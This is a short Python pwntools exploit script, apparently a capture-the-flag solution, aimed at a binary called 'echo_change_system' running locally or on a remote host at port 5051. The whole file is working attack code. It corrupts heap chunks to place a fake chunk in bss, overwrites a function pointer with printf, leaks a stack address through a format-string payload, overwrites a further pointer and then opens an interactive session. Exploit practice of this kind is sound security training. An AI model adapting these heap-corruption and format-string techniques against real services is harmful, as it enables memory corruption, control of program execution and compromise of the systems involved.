#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./echo_change_system"
elf=ELF(pwn_file)
stack_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("172.16.5.24",5051)
    pid=0

def debug():
    log.debug("stack address :0x%x"%stack_address)
    log.debug("process pid:%d"%pid)
    pause()

def add(s):
    conn.sendline("R")
    conn.sendafter("Input your string!\n",s)

def dele(index):
    conn.sendline("D")
    conn.sendlineafter("Input your index:\n",str(index))
    conn.recvuntil("FREED!")

def edit(index,s):
    conn.sendline("C")
    conn.sendafter("Input your index:",str(index))
    conn.sendafter("input your new string(no longer than the old one)\n",s)

# get a fake chunk in bss
# set fun_ptr to printf

add("a"*0x10)#0
add("a"*0x10)#1
add("a"*0x10)#2
dele(0)
f={
    0:"a"*0x10+"\x00",
    0xa0:p64(0x0),
    0xa8:p64(0x31),
    0xa0+0x30:p64(0),
    0xa0+0x38:p64(0x21),
}
add(fit(f))#3
edit(3,p64(0x6B62C0+0xb0))
dele(0)

f[0xa8]=p64(0x31)+p64(0x6b63b0)
f[0xf0]=p64(0)
f[0xf8]=p64(0x31)

add(fit(f))#4
add("a"*0x1f+"\x00")#5
add("a"*0x1f+"\x00")#6
edit(6,p64(0x461e10))#printf

conn.sendline("R")

payload="%x "*5+";0x%x\x00"
conn.sendafter("Input your string!\n",payload)
conn.recvuntil(";")

stack_address=int(conn.recvuntil("(R)"),16)
debug()
edit(3,p64(stack_address))
debug()


conn.interactive()










